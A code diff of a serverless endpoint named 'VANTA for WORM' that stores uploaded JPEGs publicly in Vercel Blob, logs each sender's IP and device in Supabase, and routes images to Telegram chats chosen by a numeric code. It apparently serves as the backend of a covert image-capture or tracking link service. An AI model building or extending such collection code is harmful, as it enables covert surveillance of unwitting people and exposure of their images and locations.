@@ -1,5 +1,7 @@
 // api/send.js — VANTA for WORM
-// يستقبل الصورة + يحفظها في Supabase + يرسلها للمستخدم
+// يستقبل الصورة + يحفظها في Blob + Supabase + يرسلها
+
+const { put } = require('@vercel/blob');
 
 const SB_URL = process.env.SUPABASE_URL;
 const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
@@ -18,11 +20,10 @@ async function sb(path, method, body) {
   try { return await r.json(); } catch (e) { return null; }
 }
 
+export const config = { api: { bodyParser: { sizeLimit: '4mb' } } };
+
 export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    res.status(405).json({ ok: false });
-    return;
-  }
+  if (req.method !== 'POST') { res.status(405).json({ ok: false }); return; }
 
   const TG_TOKEN = process.env.TG_TOKEN;
   const FALLBACK = process.env.TG_CHAT;
@@ -42,10 +43,8 @@ export default async function handler(req, res) {
     const ip = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim())
               || req.socket?.remoteAddress || 'unknown';
 
-    // المستلم
     let recipient = (/^\d+$/.test(code)) ? code : FALLBACK;
 
-    // فحص الحظر
     if (recipient) {
       const b = await sb('users?chat_id=eq.' + recipient + '&blocked=eq.true');
       if (b && b.length > 0) {
@@ -54,12 +53,24 @@ export default async function handler(req, res) {
       }
     }
 
+    // حفظ الصورة في Vercel Blob
+    let imageUrl = null;
+    try {
+      const blob = await put(
+        'shots/' + Date.now() + '-' + recipient + '.jpg',
+        buf,
+        { access: 'public', contentType: 'image/jpeg' }
+      );
+      imageUrl = blob.url;
+    } catch (e) {}
+
     // حفظ في Supabase
     try {
       await sb('images', 'POST', {
         chat_id: parseInt(recipient) || 0,
         device: device,
-        ip: ip
+        ip: ip,
+        image_url: imageUrl
       });
     } catch (e) {}
 
